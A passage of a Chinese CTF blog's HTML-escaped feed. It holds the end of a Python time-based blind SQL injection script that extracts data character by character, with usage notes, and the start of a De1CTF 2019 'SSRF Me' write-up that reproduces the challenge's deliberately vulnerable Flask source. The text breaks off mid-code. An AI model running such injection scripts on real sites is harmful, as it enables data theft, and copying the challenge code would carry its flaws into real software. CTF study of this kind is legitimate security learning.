data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34; &#34;       #查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        last &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        now &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; now &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; last &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        name &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;3备注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3备注&#34;&gt;#&lt;/a&gt; 3. 备注&lt;/h1&gt;
&lt;p&gt;1.payload 不放了，这个做题慢慢积累，网上也都有，根据题目自己写&lt;/p&gt;
&lt;p&gt;2. 能不使用 sleep 就不使用，速度比其他的方法慢太多&lt;/p&gt;
&lt;p&gt;3. 在网不好的情况下可能会出现脚本打印的字符错误，不是代码问题&lt;/p&gt;
&lt;p&gt;4. 自己写的脚本可能不完善，有问题或者有建议留言，有需求也可以自改&lt;/p&gt;
&lt;p&gt;5. 遇到新的脚本或者方法再补充&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-08-17T13:51:59.954Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/08/16/ctf/web/http/(ctfwp)py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
        <title>(ctfwp)py代码审计</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/16/ctf/web/http/(ctfwp)py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
        <content type="html">&lt;p&gt;真服了，本来觉得代码审计真没啥考的，结果被 py 代码搞得头大，c&lt;/p&gt;
&lt;p&gt;我还是记录一下吧&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;wp 大佬们都说简单，头真大，真搞心态，py 不行真是硬伤&lt;/p&gt;
&lt;h1 id=&#34;1de1ctf-2019ssrf-me&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1de1ctf-2019ssrf-me&#34;&gt;#&lt;/a&gt; 1.[De1CTF 2019]SSRF Me&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;说实话，ssrf 没咋考出来，全被代码审计坑了。。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/16/op8VaGuTXH9RgcP.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;出个真是代码也不好好给，还得自己整理：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#! /usr/bin/env python&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# #encoding=utf-8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; Flask&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; request&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; socket&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; urllib&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; json&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin&#34;&gt;reload&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;setdefaultencoding&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;latin1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Flask&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__name__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;secert_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;urandom&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Task&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; param&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sign&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;action &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; action&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;param &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; param&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sign &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sign&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sandbox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; md5&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exists&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sandbox&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mkdir&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sandbox&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;          &lt;span class=&#34;token comment&#34;&gt;#整个大类主要就是三个元素写的 action param sign&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;checkSign&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;				&lt;span class=&#34;token comment&#34;&gt;#检查，然后如果有 scan，就把东西写到 result.txt&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;scan&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;action&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;		&lt;span class=&#34;token comment&#34;&gt;#如果有 read，就读 result.txt；由此可知，俩都得有才行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                tmpfile &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./%s/result.txt&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sandbox&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                resp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; scan&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;resp &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Connection Timeout&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; resp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; resp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    tmpfile&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;resp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    tmpfile&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;read&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;action&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./%s/result.txt&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sandbox&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Action Error&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            result&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 